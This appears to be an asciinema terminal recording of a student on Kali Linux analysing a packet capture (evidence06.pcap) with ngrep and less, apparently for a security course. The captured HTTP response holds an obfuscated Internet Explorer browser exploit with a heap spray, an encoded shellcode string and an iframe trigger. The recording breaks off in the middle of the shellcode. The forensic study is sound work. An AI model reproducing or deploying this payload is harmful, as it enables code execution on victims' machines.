@@ -1,0 +1,4474 @@
+{
+  "version": 1,
+  "width": 140,
+  "height": 36,
+  "duration": 3440.695364,
+  "command": "/bin/zsh",
+  "title": "",
+  "env": {
+    "TERM": "xterm",
+    "SHELL": "/bin/zsh"
+  },
+  "stdout": [
+    [
+      0.124071,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001081,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      42.821571,
+      "n"
+    ],
+    [
+      0.343605,
+      "\u0008nc"
+    ],
+    [
+      0.240057,
+      "a"
+    ],
+    [
+      0.143997,
+      "t"
+    ],
+    [
+      0.528095,
+      "\u0008 \u0008"
+    ],
+    [
+      0.135933,
+      "\u0008 \u0008"
+    ],
+    [
+      0.488290,
+      "\u0008\u0008n \u0008"
+    ],
+    [
+      0.223737,
+      "\u0008ng"
+    ],
+    [
+      0.208313,
+      "r"
+    ],
+    [
+      0.056786,
+      "e"
+    ],
+    [
+      0.142971,
+      "p"
+    ],
+    [
+      0.688490,
+      " "
+    ],
+    [
+      0.528032,
+      "e"
+    ],
+    [
+      0.207971,
+      "v"
+    ],
+    [
+      0.111844,
+      "i"
+    ],
+    [
+      0.153502,
+      "dence06.pcap\u001b[1m \u001b[0m"
+    ],
+    [
+      3.007492,
+      "\u0008\u001b[0m i"
+    ],
+    [
+      0.063928,
+      "n"
+    ],
+    [
+      0.119982,
+      "d"
+    ],
+    [
+      0.184036,
+      "e"
+    ],
+    [
+      0.071941,
+      "s"
+    ],
+    [
+      0.664214,
+      "x"
+    ],
+    [
+      0.208087,
+      "."
+    ],
+    [
+      0.280193,
+      "\u0008 \u0008"
+    ],
+    [
+      0.144012,
+      "\u0008 \u0008"
+    ],
+    [
+      0.127658,
+      "\u0008 \u0008"
+    ],
+    [
+      0.160452,
+      "x"
+    ],
+    [
+      0.143839,
+      "."
+    ],
+    [
+      0.488058,
+      "p"
+    ],
+    [
+      0.095964,
+      "h"
+    ],
+    [
+      0.120077,
+      "p"
+    ],
+    [
+      0.617298,
+      "\r\r\n"
+    ],
+    [
+      0.014883,
+      "no suitable device found: Operation not permitted"
+    ],
+    [
+      0.000069,
+      "\r\n"
+    ],
+    [
+      0.000483,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001030,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      3.985567,
+      "ngrep evidence06.pcap index.php"
+    ],
+    [
+      0.119382,
+      "\u0008"
+    ],
+    [
+      0.500457,
+      "\u0008"
+    ],
+    [
+      0.031184,
+      "\u0008"
+    ],
+    [
+      0.030829,
+      "\u0008"
+    ],
+    [
+      0.030312,
+      "\u0008"
+    ],
+    [
+      0.030072,
+      "\u0008"
+    ],
+    [
+      0.029807,
+      "\u0008"
+    ],
+    [
+      0.030404,
+      "\u0008"
+    ],
+    [
+      0.030047,
+      "\u0008"
+    ],
+    [
+      0.032444,
+      "\u0008"
+    ],
+    [
+      0.031396,
+      "\u0008"
+    ],
+    [
+      0.030218,
+      "\u0008"
+    ],
+    [
+      0.031365,
+      "\u0008"
+    ],
+    [
+      0.030785,
+      "\u0008"
+    ],
+    [
+      0.030803,
+      "\u0008"
+    ],
+    [
+      0.031399,
+      "\u0008"
+    ],
+    [
+      0.029943,
+      "\u0008"
+    ],
+    [
+      0.030574,
+      "\u0008"
+    ],
+    [
+      0.030780,
+      "\u0008"
+    ],
+    [
+      0.030803,
+      "\u0008"
+    ],
+    [
+      0.030334,
+      "\u0008"
+    ],
+    [
+      0.031461,
+      "\u0008"
+    ],
+    [
+      0.031552,
+      "\u0008"
+    ],
+    [
+      0.030847,
+      "\u0008"
+    ],
+    [
+      0.030187,
+      "\u0008"
+    ],
+    [
+      0.974644,
+      "ievidence06.pcap index.php\u001b[25D"
+    ],
+    [
+      0.728117,
+      "\u0008\u001b[P\u001b[25C \u001b[26D"
+    ],
+    [
+      0.208181,
+      "0evidence06.pcap index.php\u001b[25D"
+    ],
+    [
+      0.800136,
+      "ievidence06.pcap index.php\u001b[25D"
+    ],
+    [
+      0.679900,
+      "\u0008\u001b[P\u001b[25C \u001b[26D"
+    ],
+    [
+      0.128020,
+      "\u0008\u001b[P\u001b[25C \u001b[26D"
+    ],
+    [
+      0.112196,
+      "-evidence06.pcap index.php\u001b[25D"
+    ],
+    [
+      0.312083,
+      "Ievidence06.pcap index.php\u001b[25D"
+    ],
+    [
+      0.439894,
+      " evidence06.pcap index.php\u001b[25D"
+    ],
+    [
+      0.391249,
+      "\u001b[1C"
+    ],
+    [
+      0.954131,
+      "\u001b[1C"
+    ],
+    [
+      0.500972,
+      "\u001b[1C"
+    ],
+    [
+      0.030929,
+      "\u001b[1C"
+    ],
+    [
+      0.031280,
+      "\u001b[1C"
+    ],
+    [
+      0.030230,
+      "\u001b[1C"
+    ],
+    [
+      0.030368,
+      "\u001b[1C"
+    ],
+    [
+      0.031416,
+      "\u001b[1C"
+    ],
+    [
+      0.029459,
+      "\u001b[1C"
+    ],
+    [
+      0.031296,
+      "\u001b[1C"
+    ],
+    [
+      0.031759,
+      "\u001b[1C"
+    ],
+    [
+      0.031239,
+      "\u001b[1C"
+    ],
+    [
+      0.030523,
+      "\u001b[1C"
+    ],
+    [
+      0.030373,
+      "\u001b[1C"
+    ],
+    [
+      0.031233,
+      "\u001b[1C"
+    ],
+    [
+      0.030017,
+      "\u001b[1C"
+    ],
+    [
+      0.031935,
+      "\u001b[1C"
+    ],
+    [
+      0.030893,
+      "\u001b[1C"
+    ],
+    [
+      0.030802,
+      "\u001b[1C"
+    ],
+    [
+      0.031429,
+      "\u001b[1C"
+    ],
+    [
+      0.031272,
+      "\u001b[1C"
+    ],
+    [
+      0.031212,
+      "\u001b[1C"
+    ],
+    [
+      0.029915,
+      "\u001b[1C"
+    ],
+    [
+      0.031034,
+      "\u001b[1C"
+    ],
+    [
+      0.031534,
+      "\u001b[1C"
+    ],
+    [
+      0.538182,
+      " "
+    ],
+    [
+      0.175916,
+      "|"
+    ],
+    [
+      0.103653,
+      " "
+    ],
+    [
+      0.216470,
+      "l"
+    ],
+    [
+      0.080001,
+      "e"
+    ],
+    [
+      0.048562,
+      "s"
+    ],
+    [
+      0.191695,
+      "s"
+    ],
+    [
+      0.176584,
+      "\r\r\n"
+    ],
+    [
+      0.009180,
+      "\u001b[?1049h\u001b[?1h\u001b=\r"
+    ],
+    [
+      0.000187,
+      "input: evidence06.pcap"
+    ],
+    [
+      0.000026,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "match: index.php"
+    ],
+    [
+      0.000017,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "#"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000017,
+      "T 10.10.10.70:1035 -\u003e 10.10.10.10:8080 [AP]"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000024,
+      "  GET /index.php HTTP/1.1..Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*..Accept-Langua"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "  ge: en-us..Accept-Encoding: gzip, deflate..User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)..Host: 10.10.10.10:8080."
+    ],
+    [
+      0.000017,
+      "\r\n"
+    ],
+    [
+      0.000024,
+      "  .Connection: Keep-Alive....                                                                                                            "
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000017,
+      "#####"
+    ],
+    [
+      0.000017,
+      "\r\n"
+    ],
+    [
+      0.000023,
+      "T 10.10.10.10:8080 -\u003e 10.10.10.70:1035 [A]"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "  sTVjNNgHkBIdNwmxtUMqQzsbpqNyO + LLVcUmerhpt;.}.function CkoNbET(OZaAHBUXXTUpHcLuyXFerYFtnsKQFzFRKsWwuisbjjaqDCeJARnzqPxUhjKhBZZJkohA).{"
+    ],
+    [
+      0.000017,
+      "\r\n"
+    ],
+    [
+      0.000395,
+      "  .  XyFfBwnvNTHaNNqCqPKVxmwOjqwptvyJsLDUgweSdLDgm();.  dccahTiTDPLKAIGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOh"
+    ],
+    [
+      0.000030,
+      "\r\n"
+    ],
+    [
+      0.000029,
+      "  wy = document.createEventObject(OZaAHBUXXTUpHcLuyXFerYFtnsKQFzFRKsWwuisbjjaqDCeJARnzqPxUhjKhBZZJkohA);.  document.getElementById(\"jWfnz"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.000021,
+      "  fLhenIemfKFynaujTIQUhzZVHTcZuJaeFtmqBXYrwn\").innerHTML = \""
+    ],
+    [
+      0.000135,
+      "\";.  window.setInterval(vldTpeimKzBERsNeByodkqCLvbmselSexjNZwNtHDaWDkZKQHlZIK"
+    ],
+    [
+      0.001803,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "  IZtQqNeWtWcZzpDoMXcAjkyyhRONrLy, 50);.}.function vldTpeimKzBERsNeByodkqCLvbmselSexjNZwNtHDaWDkZKQHlZIKIZtQqNeWtWcZzpDoMXcAjkyyhRONrLy()"
+    ],
+    [
+      0.000038,
+      "\r\n"
+    ],
+    [
+      0.000017,
+      "  .{.  p = \"\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0"
+    ],
+    [
+      0.000016,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "  d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\";.  for"
+    ],
+    [
+      0.000016,
+      "\r\n"
+    ],
+    [
+      0.000016,
+      "   (i = 0; i \u003c qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR.length; i++).  {.    qSN"
+    ],
+    [
+      0.000015,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "  gVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR[i].data = p;.  }.  var t = dccahTiTDPLKA"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000016,
+      "  IGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOhwy.srcElement;.}.\u003c/script\u003e.\u003c/head\u003e.\u003cbody\u003e.\u003cspan id=\"jWfnzfLhenIemfK"
+    ],
+    [
+      0.000015,
+      "\r\n"
+    ],
+    [
+      0.000017,
+      "  FynaujTIQUhzZVHTcZuJaeFtmqBXYrwn\"\u003e\u003ciframe src=\"/index.phpmfKSxSANkeTeNrah.gif\" onload=\"CkoNbET(event)\" /\u003e\u003c/spa     "
+    ],
+    [
+      0.000178,
+      "                    "
+    ],
+    [
+      0.000021,
+      "\r\n"
+    ],
+    [
+      0.000016,
+      "###"
+    ],
+    [
+      0.000015,
+      "\r\n"
+    ],
+    [
+      0.000015,
+      "T 10.10.10.70:1035 -\u003e 10.10.10.10:8080 [AP]"
+    ],
+    [
+      0.000023,
+      "\r\n"
+    ],
+    [
+      0.000016,
+      "  GET /index.phpmfKSxSANkeTeNrah.gif HTTP/1.1..Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash"
+    ],
+    [
+      0.000015,
+      "\r\n"
+    ],
+    [
+      0.000016,
+      "  , */*..Referer: http://10.10.10.10:8080/index.php..Accept-Language: en-us..Accept-Encoding: gzip, deflate..User-Agent: Mozilla/4.0 (com"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.000016,
+      "  patible; MSIE 6.0; Windows NT 5.1; SV1)..Host: 10.10.10.10:8080..Connection: Keep-Alive....                                            "
+    ],
+    [
+      0.000015,
+      "\r\n"
+    ],
+    [
+      0.000132,
+      "############################################################################################################################################ \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008##################################################################################################################"
+    ],
+    [
+      0.000741,
+      "########################## \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008############################################################################################################################################ \u0008#"
+    ],
+    [
+      0.000089,
+      "########################################################################################################################################### \u0008"
+    ],
+    [
+      0.002408,
+      ":\u001b[K"
+    ],
+    [
+      21.191312,
+      "\r\u001b[K\u001b[?1l\u001b\u003e\u001b[?1049l\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001406,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      354.059031,
+      "l"
+    ],
+    [
+      0.055889,
+      "\u0008ls"
+    ],
+    [
+      0.113282,
+      "\r\r\n"
+    ],
+    [
+      0.002755,
+      "10k most common.txt"
+    ],
+    [
+      0.000083,
+      "\t"
+    ],
+    [
+      0.000025,
+      " hw6"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000026,
+      "\t"
+    ],
+    [
+      0.000020,
+      "usernames-c.txt        usernames-m.txt"
+    ],
+    [
+      0.000020,
+      "\t"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000025,
+      "\t"
+    ],
+    [
+      0.000019,
+      " usernames-w.txt"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000024,
+      "10k most common.zip"
+    ],
+    [
+      0.000025,
+      "\t"
+    ],
+    [
+      0.000019,
+      " john.txt"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000025,
+      "usernames-d.txt        usernames-n.txt"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000025,
+      " usernames-y.txt"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000023,
+      "4"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000025,
+      "\t"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000018,
+      " output.out"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000019,
+      "usernames-e.txt        usernames-o.txt"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000019,
+      " username_wordlists.zip"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000023,
+      "4.orig"
+    ],
+    [
+      0.000025,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      " practicum1"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "usernames-f.txt        usernames-p.txt"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      " WebGoat-6.0.1-war-exec.jar"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000030,
+      "500-worst-passwords.txt  practicum2"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "usernames-generic.txt  usernames-r.txt"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      " wifi_wordlist.txt"
+    ],
+    [
+      0.000025,
+      "\r\n"
+    ],
+    [
+      0.000023,
+      "cain.txt"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000025,
+      " rdesktop-1.8.3"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "usernames-g.txt        usernames-s.txt"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      " wordpress"
+    ],
+    [
+      0.000025,
+      "\r\n"
+    ],
+    [
+      0.000024,
+      "dnsSearch.sh"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000025,
+      " rdesktop-1.8.3.tar.gz"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000019,
+      "usernames-h.txt        usernames-top100-each-letter.txt  wordpress-2.9.2.tar.gz"
+    ],
+    [
+      0.000020,
+      "\r\n"
+    ],
+    [
+      0.000029,
+      "evidence06.pcap"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      " skipfish_scans"
+    ],
+    [
+      0.000027,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "usernames-j.txt        usernames-t.txt"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "exploit.sql"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000028,
+      " usernames-a.txt"
+    ],
+    [
+      0.000032,
+      "\t"
+    ],
+    [
+      0.000019,
+      "usernames-k.txt        usernames-u.txt"
+    ],
+    [
+      0.000028,
+      "\r\n"
+    ],
+    [
+      0.000022,
+      "foo.dot"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000024,
+      "\t"
+    ],
+    [
+      0.000019,
+      "\t"
+    ],
+    [
+      0.000018,
+      " usernames-b.txt"
+    ],
+    [
+      0.000018,
+      "\t"
+    ],
+    [
+      0.000027,
+      "usernames-l.txt        usernames-v.txt"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000499,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001164,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      4.112317,
+      "l"
+    ],
+    [
+      0.096290,
+      "\u0008le"
+    ],
+    [
+      0.071485,
+      "s"
+    ],
+    [
+      0.232209,
+      "s"
+    ],
+    [
+      0.088137,
+      " "
+    ],
+    [
+      0.127901,
+      "o"
+    ],
+    [
+      0.080310,
+      "u"
+    ],
+    [
+      0.063739,
+      "t"
+    ],
+    [
+      0.058087,
+      "put.out\u001b[1m \u001b[0m"
+    ],
+    [
+      0.302332,
+      "\u0008\u001b[0m \u0008"
+    ],
+    [
+      0.000070,
+      "\r"
+    ],
+    [
+      0.000049,
+      "\r\n"
+    ],
+    [
+      0.012678,
+      "\u001b[?1049h\u001b[?1h\u001b=\r"
+    ],
+    [
+      0.000180,
+      "GET /index.php HTTP/1.1"
+    ],
+    [
+      0.000027,
+      "\r\n"
+    ],
+    [
+      0.000020,
+      "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000027,
+      "Accept-Language: en-us"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "Accept-Encoding: gzip, deflate"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000026,
+      "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "Host: 10.10.10.10:8080"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "Connection: Keep-Alive"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000042,
+      "\r\n"
+    ],
+    [
+      0.000027,
+      "HTTP/1.1 200 OK"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "Content-Type: text/html"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "Pragma: no-cache"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "Connection: Keep-Alive"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000027,
+      "Server: Apache"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "Content-Length: 5748"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "\u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"\u003e"
+    ],
+    [
+      0.000020,
+      "\r\n"
+    ],
+    [
+      0.000026,
+      "\u003chtml\u003e"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "\u003chead\u003e"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000026,
+      "\u003cscript\u003e"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "var UWnHADOfYHiHDDXj = \"COMMENT\";"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.000022,
+      "var qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR = new Array();"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "for (i = 0; i \u003c 1300; i++)"
+    ],
+    [
+      0.000026,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "{"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "  qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR[i] = document.createElement(UWnHADOfYHiH \u0008DDXj);"
+    ],
+    [
+      0.000027,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "  qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR[i].data = \"vEI\";"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "}"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "var dccahTiTDPLKAIGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOhwy = null;"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000292,
+      "var VTWgXjXYoSTHY = new Array();"
+    ],
+    [
+      0.000027,
+      "\r\n"
+    ],
+    [
+      0.000019,
+      "var lwFZUGyxMIWTGMBfMqyKxGTRyRuDasLmlzjI = unescape;"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000029,
+      "function XyFfBwnvNTHaNNqCqPKVxmwOjqwptvyJsLDUgweSdLDgm()"
+    ],
+    [
+      0.000019,
+      "\r\n"
+    ],
+    [
+      0.000018,
+      "{"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.000032,
+      "  var LLVcUmerhpt = lwFZUGyxMIWTGMBfMqyKxGTRyRuDasLmlzjI( '%u0d9b%u2cb8%u6b70%u1dd4%u1cb3%u08b7%u39f5%u3ffd%u99b4%u928d%u0442%u024e%u3ce2%ub \u0008193%u2dba%u3776%u430c%ua8b6%u9735%u247e%u77b2%u3446%u91be%u4148%uf822%u99a9%u787d%ub966%u43ba%u4b7c%u488d%u7037%u0472%u9815%ueb31%u2b25%u24d \u00085%ub3b0%u3c1d%u6997%ub4f5%u4e93%u18a9%u41e3%u2c7a%u0c9b%u402d%u13bb%u7bfc%u9114%u3b46%ufdd2%u7f67%ud619%u3071%u3fe1%u7690%u3d4f%u3574%u2fb6% \u0008u0573%ue280%u4775%ua8b2%ue086%u2979%ubef9%ub5b8%uf811%u929f%u960d%u1c27%ud420%ubfb1%u4234%u4a7e%ub749%u2d77%u7776%u9f2f%u2797%u7124%u7a72%u3 \u0008770%ud410%u0190%u7ee3%u4274%ueb85%u4873%ua81c%ubf0c%ue009%ufe38%ue2c1%u8d46%u4793%u9914%u7db8%uf81a%ubb25%u3579%ue188%u402c%u3f7b%u2866%u05d \u0008\u001b[7moutput.out\u001b[27m\u001b[K"
+    ],
+    [
+      2.473637,
+      "\r\u001b[K5%u75b4%ud00b%u34d6%u1da9%uf533%ufd81%u0d41%u929b%u7fbe%u3a43%ub9f9%ub04e%uba49%u15b7%ub1b5%u964b%ufc03%ub24a%ub391%u4f98%u04b6%u6778%u3c7c% \u0008:\u001b[K"
+    ],
+    [
+      0.512103,
+      "\r\u001b[Ku707d%u933d%u1c7c%u3cb5%u4798%u783d%ue232%u7974%ub805%u4924%u9299%u2596%u417f%uf989%u9bb6%u2d4e%ub24b%u2746%u1248%u3feb%ud687%u6697%ufc84%ud \u0008:\u001b[K"
+    ],
+    [
+      0.500333,
+      "\r\u001b[K42a%u0c04%ub1b3%u674f%u3171%u7ae0%u7335%ud52b%u1d91%u2f7e%u4072%u77a9%ua82c%ub042%u3bb4%u0de1%u3776%u8d34%u7bb7%ue321%u1975%uf8d3%uf586%uba9 \u0008:\u001b[K"
+    ],
+    [
+      0.035606,
+      "\r\u001b[K0%u4abb%u1443%u15b9%u13bf%ubefd%u819f%u79e0%u2f70%u6677%u0105%u72e1%u9042%u8db2%u154b%u7673%u7e3d%ue230%u3475%u8592%ubfd5%u4604%u1d78%ud428% \u0008:\u001b[K"
+    ],
+    [
+      0.033067,
+      "\r\u001b[Kube2d%u3548%u9b99%u9793%ubbb4%ub6b5%u9843%u3ca9%u4a37%uf584%u4e74%u3f1c%u6949%u03fd%u0cf9%u1471%u2540%u41b0%u20b8%u88d6%u7ae3%u9f4f%u7b47%ud \u0008:\u001b[K"
+    ],
+    [
+      0.035035,
+      "\r\u001b[K12a%uebc0%u0d2c%u9624%ub9ba%u7cb1%u677f%ufc1a%u9127%ua8b7%u727d%ueb29%uf86b%u97b3%u0470%uf71b%u12e2%u15e0%uba24%u787e%u4e77%u7b99%u9348%u80b \u0008:\u001b[K"
+    ],
+    [
+      0.031110,
+      "\r\u001b[K1%u7ae1%u3466%u7db0%u2d7c%u8d4f%u1049%u41e3%u14a9%u712c%u7476%u3567%u960d%u9fbe%ub3bb%u377f%uf50a%u3ab7%u33fc%u25d4%ub992%u799b%u4073%ub61d% \u0008:\u001b[K"
+    ],
+    [
+      0.033001,
+      "\r\u001b[Kub20c%u3f2f%ub427%u9805%u094b%ubff9%u7475%u7f1c%u4273%u4a79%ua8b5%ue389%uf811%u4676%u3c71%u0872%u78d5%ufd23%u91b8%u8c90%u18e2%u3de1%u0b7e%u7 \u0008:\u001b[K"
+    ],
+    [
+      0.031594,
+      "\r\u001b[K5d6%u7a43%u7047%uf539%u4b7c%u7d99%ubf40%u1c7b%u388d%u42e0%ub993%ua947%uc183%u2feb%ud602%uba25%u32bb%u35f8%ubeb3%ub49f%ud014%u48d4%ua896%u4f2 \u0008:\u001b[K"
+    ],
+    [
+      0.030115,
+      "\r\u001b[Kd%u4605%ud5f6%u3d3c%u9715%u493f%u0db6%u924e%ufcb0%u2c4a%u9b37%u9834%u27b2%u7790%u240c%ub504%u1d66%u91b8%ub167%ufdd2%u4143%u22b7%udbf9%ud9df% \u0008:\u001b[K"
+    ],
+    [
+      0.031258,
